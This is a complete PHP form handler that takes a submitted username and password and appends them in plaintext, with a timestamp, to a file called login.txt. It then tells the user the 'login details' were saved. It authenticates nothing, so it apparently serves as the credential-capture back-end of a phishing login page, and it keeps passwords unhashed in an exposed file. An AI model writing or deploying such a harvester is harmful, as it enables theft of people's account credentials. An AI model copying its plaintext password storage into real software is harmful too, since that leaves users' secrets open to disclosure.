<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve user input and sanitize it
    $username = htmlspecialchars($_POST['username']); 
    $password = htmlspecialchars($_POST['password']); 

    // Save credentials to login.txt
    $file = fopen("login.txt", "a");
    $entry = "Username: $username\nPassword: $password\nLogged in at: " . date("Y-m-d H:i:s") . "\n\n";
    fwrite($file, $entry);
    fclose($file);

    // Display confirmation message
    echo "
    <div style='font-family: Arial, sans-serif; text-align: center; margin-top: 50px;'>
        <h1 style='color: green;'>Login details saved successfully!</h1>
        <p>Go back to <a href='index.html'>Login Page</a></p>
    </div>";
}
?>